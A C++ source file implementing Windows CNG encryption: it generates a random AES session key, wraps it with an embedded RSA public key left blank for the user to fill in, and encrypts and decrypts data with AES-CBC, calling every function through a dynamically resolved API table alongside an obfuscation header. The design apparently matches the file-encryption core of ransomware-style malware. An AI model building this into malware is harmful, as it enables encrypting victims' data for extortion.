#include "Core/ntdefs.h"
#include "Crypto/encryption.h"
#include "Crypto/obfuscation.h"
#include "Core/api_resolve.h"
#include "Utils/helpers.h"
#include <malloc.h>
#include <cstring>

API_TABLE& API = GetAPI();


const BYTE RsaPublicKeyBlob[] = {
    //replace with your own generated blob
};


bool GenerateSessionKey(BYTE* aesKey, ULONG keySize)
{
    // Validate arguments
    if (!aesKey || keySize == 0)
        return false;

    BCRYPT_ALG_HANDLE hAlgorithm = nullptr;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    bool success = false;

    
    // Open RNG provider
    status = API.BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_RNG_ALGORITHM, nullptr, 0);

    if (!BCRYPT_SUCCESS(status))
        goto CLEANUP;


    // Generate cryptographically secure random bytes
    status = API.BCryptGenRandom(hAlgorithm, aesKey, keySize, 0);

    if (!BCRYPT_SUCCESS(status))
        goto CLEANUP;

    success = true;

CLEANUP:
    if (hAlgorithm)
    {
        API.BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        hAlgorithm = nullptr;
    }

    return success;
}


bool EncryptSessionKeyRSA(BYTE* aesKey, ULONG aesKeySize, BYTE* encryptedKeyOut, ULONG* encryptedKeySize) {
    if (!aesKey || aesKeySize == 0 || !encryptedKeyOut || !encryptedKeySize) {
        return false;
    }

    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = 0;
    bool success = false;
    ULONG cbResult = 0;

    //open RSA provider
    status = API.BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //Public Key Blob
    status = API.BCryptImportKeyPair(hAlgorithm,  NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, (PUCHAR)RsaPublicKeyBlob, sizeof(RsaPublicKeyBlob), 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //encrypt AES key
    status = API.BCryptEncrypt(hKey, aesKey, aesKeySize, NULL, NULL, 0, encryptedKeyOut, *encryptedKeySize, &cbResult, BCRYPT_PAD_PKCS1 );
    
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    *encryptedKeySize = cbResult;
    success = true;

CLEANUP:
    if (hKey) {
        API.BCryptDestroyKey(hKey);
        hKey = NULL;
    }
    if (hAlgorithm) {
        API.BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        hAlgorithm = NULL;
    }

    return success;
}

//encryption
bool AESEncrypt(BYTE* key, ULONG keySize, BYTE* plainText, ULONG plainTextSize, BYTE* cipherText, ULONG* cipherTextSize, BYTE* iv) {
    if (!key || !plainText || !cipherText || !cipherTextSize || !iv) return false;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    HANDLE hHeap = NULL;
    NTSTATUS status = 0;
    bool success = false;

    DWORD cbData = 0;
    DWORD cbKeyObject = 0;
    DWORD cbBlockLen = 0;
    BYTE* pbKeyObject = NULL;
    BYTE  localIv[16]; //16-byte Block Size / IV

    custom_memcpy(localIv, iv, 16);

    //open AES Provider
    status = API.BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    // CBC Mode (Cipher Block Chaining)
    status = API.BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //calculate memory allocation in kernel for key object
    status = API.BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    // Allocate memory in Stack
    hHeap = API.GetProcessHeap();
    pbKeyObject = (BYTE*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, cbKeyObject);
    if (!pbKeyObject) goto CLEANUP;

    //create symmetric key
    status = API.BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, keySize, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //encrypt (PKCS7 Padding)
    status = API.BCryptEncrypt(hKey, plainText, plainTextSize, NULL, localIv, 16, cipherText, *cipherTextSize, &cbData, BCRYPT_BLOCK_PADDING);

    if (BCRYPT_SUCCESS(status)) {
        *cipherTextSize = cbData;
        success = true;
    }

CLEANUP:
    if (hKey){ 
        API.BCryptDestroyKey(hKey);
        hKey = NULL;
    }
    
    if (pbKeyObject) {
        SecureZeroMemory(pbKeyObject, cbKeyObject);
        API.RtlFreeHeap(hHeap, 0, pbKeyObject);     //free heap
    }
    
    if (hAlg){ 
        API.BCryptCloseAlgorithmProvider(hAlg, 0);
        hAlg = NULL;
    }

    return success;
}


//decryption
bool AESDecrypt(BYTE* key, ULONG keySize, BYTE* cipherText, ULONG cipherTextSize, BYTE* plainText, ULONG* plainTextSize, BYTE* iv) {
    HANDLE hHeap = NULL;

    if (!key || !cipherText || !plainText || !plainTextSize || !iv) return false;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = 0;
    bool success = false;

    DWORD cbData = 0;
    DWORD cbKeyObject = 0;
    BYTE* pbKeyObject = NULL;
    BYTE  localIv[16];

    custom_memcpy(localIv, iv, 16);

    //open AES Provider
    status = API.BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //CBC Mode
    status = API.BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    // calculate memory for key object
    status = API.BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    // Allocate memory in Stack
    hHeap = API.GetProcessHeap();
    pbKeyObject = (BYTE*)API.RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, cbKeyObject);
    if (!pbKeyObject) goto CLEANUP;
    //create symmetric key
    status = API.BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, keySize, 0);
    if (!BCRYPT_SUCCESS(status)) goto CLEANUP;

    //decrypt (remove PKCS7 Padding)
    status = API.BCryptDecrypt(hKey, cipherText, cipherTextSize, NULL, localIv, 16, plainText, *plainTextSize, &cbData, BCRYPT_BLOCK_PADDING);

    if (BCRYPT_SUCCESS(status)) {
        *plainTextSize = cbData;
        success = true;
    }

CLEANUP:
    if (hKey){ 
        API.BCryptDestroyKey(hKey);
        hKey = NULL;
    }

    if (pbKeyObject) {
        SecureZeroMemory(pbKeyObject, cbKeyObject);
        API.RtlFreeHeap(hHeap, 0, pbKeyObject);
    }    
    
    if (hAlg){ 
        API.BCryptCloseAlgorithmProvider(hAlg, 0);
        hAlg = NULL;
    }
    return success;
}
